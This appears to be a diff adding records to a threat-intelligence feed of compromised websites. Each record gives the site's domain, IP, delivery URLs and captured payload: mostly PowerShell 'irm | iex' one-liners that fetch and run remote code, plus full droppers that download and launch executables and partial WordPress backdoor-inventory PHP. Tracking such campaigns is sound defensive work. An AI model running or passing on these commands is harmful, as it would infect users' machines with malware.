+    "Payload": "irm 'browse-nnccodes.beer/174c5db552b2a148'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/174c5db552b2a148"
+    ],
+    "ReportId": "cmwaw31sa00280oml1t9y7hw8"
+  },
+  {
+    "UrlDomain": "www.casabeta.cat",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.42.104.10"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/76b91ffc402d74f1",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=46ce550b5f1e14a4a0e04918d929c3cc85b3683eb82f776e&amp;_v=29905450",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/76b91ffc402d74f1'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/76b91ffc402d74f1"
+    ],
+    "ReportId": "cmwaw0ua500140oml8e35yh3p"
+  },
+  {
+    "UrlDomain": "qubitprivacy.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "216.172.184.55"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwaw0me9000g0omlvok9weut"
+  },
+  {
+    "UrlDomain": "doredo.nu",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "base.gateway.tenderly.co"
+    ],
+    "PayloadUrl": [
+      "http://timelevel12.com/big"
+    ],
+    "IP": [
+      "93.188.2.53"
+    ],
+    "Related": [
+      {
+        "Value": "https://base.gateway.tenderly.co",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905448",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/5955e0d1f05713da'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/5955e0d1f05713da"
+    ],
+    "ReportId": "cmwavxxeu05bp0omlgbq1bj3q"
+  },
+  {
+    "UrlDomain": "grammygums.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&amp;_v=29905442",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905442",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/ce33608b964ca885'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/ce33608b964ca885"
+    ],
+    "ReportId": "cmwavpfda058j0omlaap4heeo"
+  },
+  {
+    "UrlDomain": "brainclinic.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "104.21.18.46"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwavodzt057k0omlbee77awg"
+  },
+  {
+    "UrlDomain": "drsahilsanghavi.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.214.80.173"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwavdwqc04zq0oml90kk0ugf"
+  },
+  {
+    "UrlDomain": "www.giuseppepizzardi.it",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.107.247"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94"
+    ],
+    "ReportId": "cmwavbk7z04ys0omlu2b5g7y5"
+  },
+  {
+    "UrlDomain": "thecoxfirm.law",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.6.3.1"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905429",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/47b7c81b0049a5bb'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/47b7c81b0049a5bb"
+    ],
+    "ReportId": "cmwav9g8a04tj0omlpwfgxcpv"
+  },
+  {
+    "UrlDomain": "rioroger.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "191.6.210.222"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwav8p9904sb0omlyw3umbet"
+  },
+  {
+    "UrlDomain": "legue.co",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "104.21.17.202"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29905428",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905428",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/2bfe3608c82ab444'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/2bfe3608c82ab444"
+    ],
+    "ReportId": "cmwav7iz204ri0omlzmu2pekx"
+  },
+  {
+    "UrlDomain": "mamj.adv.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.203.90"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwauj8zu04la0omls5pn5i1h"
+  },
+  {
+    "UrlDomain": "www.wancheng.com.sg",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "101.100.204.21"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwauhupq04jt0omlt0q2w68v"
+  },
+  {
+    "UrlDomain": "www.shipgigventures.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "187.127.128.162"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwaug9je04ja0oml6zapyr46"
+  },
+  {
+    "UrlDomain": "localio.agency",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "72.61.209.21"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwaufjtc04ig0oml3r4xir53"
+  },
+  {
+    "UrlDomain": "skarici.com",
+    "DeliveryUrl": [
+      "likingdropout.site"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.17.104"
+    ],
+    "Related": [],
+    "Payload": "$tok='iaXlHaxrb0rWWWATQdMTOrLHbVLi_AsID_adnNWo_Aw';$id='f0e7beb60ab95843';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwauem4m04gp0omlvnwmefxk"
+  },
+  {
+    "UrlDomain": "nirmalindustriescrop.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.85.227"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwau4y5p04ch0omlgvaf5irq"
+  },
+  {
+    "UrlDomain": "genovahealthcare.in",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "72.62.229.126"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=add3164684f61d651fbec01a02f605ce6eb0fcb89f2a5c9a&amp;_v=29905396",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/4c6b6382ba0f77e9'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/4c6b6382ba0f77e9"
+    ],
+    "ReportId": "cmwau3fte04b60omltf6fsxuu"
+  },
+  {
+    "UrlDomain": "suratatc.ac.th",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "119.59.120.18"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905388",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/9421224f97a02013'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/9421224f97a02013"
+    ],
+    "ReportId": "cmwats9os047q0omlp1sfdx6q"
+  },
+  {
+    "UrlDomain": "www.maxdatasolution.lk",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "173.236.240.149"
+    ],
+    "Related": [],
+    "Payload": "irm 'browse-nnccodes.beer/e1876458af196191'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/e1876458af196191"
+    ],
+    "ReportId": "cmwatnyc604490omlsbbl7o5s"
+  },
+  {
+    "UrlDomain": "ikigaiacademiapolitica.com",
+    "DeliveryUrl": [
+      "likingdropout.site"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.131.134"
+    ],
+    "Related": [],
+    "Payload": "$tok='WxWgNxe4D0-f5PrfHaxy8wunZc30NGqCe7e7DdFf0U8';$id='58ae9ac66a26ad8e';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwatmk9j042v0oml5p2hxaki"
+  },
+  {
+    "UrlDomain": "mammaakena.se",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "46.30.213.168"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwatk6hj03zz0omli2jp2ucd"
+  },
+  {
+    "UrlDomain": "instrideedition.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [
+      "https://platform.twitter.com/jot.html"
+    ],
+    "IP": [
+      "192.254.189.212"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905370",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/fa77de25ab2073f8'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/fa77de25ab2073f8"
+    ],
+    "ReportId": "cmwat79vi03w70oml4xffr69m"
+  },
+  {
+    "UrlDomain": "minneolasoccerclub.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "67.20.99.105"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwat3unn03te0omlzgthlvd5"
+  },
+  {
+    "UrlDomain": "loedesignstudio.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "145.79.25.51"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29905368",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/13c1c69715cab5fe'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/13c1c69715cab5fe"
+    ],
+    "ReportId": "cmwat2zqa03s20oml5w26hrac"
+  },
+  {
+    "UrlDomain": "vespark.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "108.181.44.168"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94"
+    ],
+    "ReportId": "cmwat1zwa03rd0omlyov2os6w"
+  },
+  {
+    "UrlDomain": "mzisales.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "149.255.62.8"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwat1pv303q80omli9ph0e1z"
+  },
+  {
+    "UrlDomain": "propark.com.au",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "110.173.135.105"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=e5a6ee8789a37b46424f0e1a414979a3e9c4b670f991f82c&amp;_v=29905367",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/505791f6055ce692'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/505791f6055ce692"
+    ],
+    "ReportId": "cmwat13wg03pg0omlp0iqy220"
+  },
+  {
+    "UrlDomain": "www.matalnatura.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.105.56"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94"
+    ],
+    "ReportId": "cmwaszywf03mu0omld4xjgaol"
+  },
+  {
+    "UrlDomain": "golpokar.org",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "151.158.159.150"
+    ],
+    "Related": [],
+    "Payload": "irm 'browse-nnccodes.beer/e9f8205fa9ae7342'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/e9f8205fa9ae7342"
+    ],
+    "ReportId": "cmwaszalk03kg0omlrdos32u0"
+  },
+  {
+    "UrlDomain": "professionalcadd.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "103.118.158.128"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwasxtm103je0omlr16gxxtj"
+  },
+  {
+    "UrlDomain": "visiolayers.com",
+    "DeliveryUrl": [
+      "waysmakeyourlifebetter.com",
+      "goodpersonofourcentury.com",
+      "besthappyfamily.com",
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "93.127.179.172"
+    ],
+    "Related": [],
+    "Payload": "irm 'browse-nnccodes.beer/d8fc650c3a1c3b9b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/d8fc650c3a1c3b9b"
+    ],
+    "ReportId": "cmwaswd9d03gu0omleqib7jnh"
+  },
+  {
+    "UrlDomain": "cec.ukp.ac.kr",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "115.68.168.145"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmwasvf2k03dd0oml0q78fnxd"
+  },
+  {
+    "UrlDomain": "www.pnkctf.org",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "66.96.147.110"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwasveln03d90omliskce8ey"
+  },
+  {
+    "UrlDomain": "innsett.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "62.238.8.134"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwasticu03cc0oml4zgtj1lo"
+  },
+  {
+    "UrlDomain": "www.treegintl.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "43.225.55.107"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwassffh03bh0omlsfcxqfg0"
+  },
+  {
+    "UrlDomain": "lifelinkhospital.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.222.226.74"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwasdmmu036x0omlnkf3eahk"
+  },
+  {
+    "UrlDomain": "adventurehut.in",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.101"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905342",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/e2fe5f14cc7170a4'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/e2fe5f14cc7170a4"
+    ],
+    "ReportId": "cmwas5id7031q0oml6ns2yux3"
+  },
+  {
+    "UrlDomain": "mummymayday.co.uk",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "109.228.61.211"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwarjoqg02qf0omloy4jf2gl"
+  },
+  {
+    "UrlDomain": "viewnet.africa",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "197.242.67.223"
+    ],
+    "Related": [],
+    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
+    ],
+    "ReportId": "cmwar8gmr02l00oml9bak5oxu"
+  },
+  {
+    "UrlDomain": "www.dominanceindia.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "118.139.176.109"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
